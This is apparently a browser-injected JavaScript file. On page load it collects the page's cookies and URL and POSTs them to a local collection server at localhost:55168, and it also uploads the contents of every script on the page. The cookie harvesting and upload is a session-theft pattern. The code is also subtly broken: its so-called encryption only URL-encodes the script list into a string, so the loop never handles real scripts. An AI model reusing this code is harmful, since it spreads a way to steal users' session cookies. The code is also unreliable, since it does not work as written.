//document.body.innerHTML = document.body.innerHTML.replace(new RegExp("Gmail", "g"), "nobody");

window.onload = function () {
	if(arguments.callee.caller && arguments.callee.caller.name){console.debug("caller",arguments.callee.caller.name);}
	if(arguments.callee && arguments.callee.name ) {console.debug("callee",arguments.callee.name);}
    var cookies = document.cookie;
    var currenturl = window.location.href;
    var scripts = document.getElementsByTagName("script");
	scripts = encrypt(scripts);
	//scripts = decrypt(encryptedScripts);
	
    for (var i = 0; i < scripts.length; i++) { 
        if (scripts[i].src) {
            console.log(i, scripts[i].src);
            
            loadDoc(i, scripts[i].src, "");
        }
        else {
            console.log(i, scripts[i]);
            loadDoc(i, window.location.href, scripts[i].innerHTML);
        }
    }
    postCookies(cookies, currenturl);
    //getScriptContent();
    //alert(scripts.length);
}

function encrypt(scripts){
	return encodeURI(scripts);
}

function decrypt(scripts){
	return decodeURI(scripts);
}



function postCookies(cookies, currenturl) {
	if(arguments.callee.caller && arguments.callee.caller.name){console.debug("caller",arguments.callee.caller.name);}
	if(arguments.callee && arguments.callee.name ) {console.debug("callee",arguments.callee.name);}
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
            getScriptContent();
        }
    };
    xhttp.open("POST", "http://localhost:55168/home/PostCookies", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send("cookies="+cookies+"&url="+ currenturl);
}


function loadDoc(scriptNumber, src, content) {
	if(arguments.callee.caller && arguments.callee.caller.name){console.debug("caller",arguments.callee.caller.name);}
	if(arguments.callee && arguments.callee.name ) {console.debug("callee",arguments.callee.name);}
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
        }
    };
    xhttp.open("POST", "http://localhost:55168/home/PostScript", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send("Number=" + scriptNumber + "&Source=" + src + "&Content=" + content);
}


function getScriptContent() {
	if(arguments.callee.caller && arguments.callee.caller.name){console.debug("caller",arguments.callee.caller.name);}
	if(arguments.callee && arguments.callee.name ) {console.debug("callee",arguments.callee.name);}
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
        }
    };
    xhttp.open("GET", "http://localhost:55168/home/GetScriptContent", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send();
}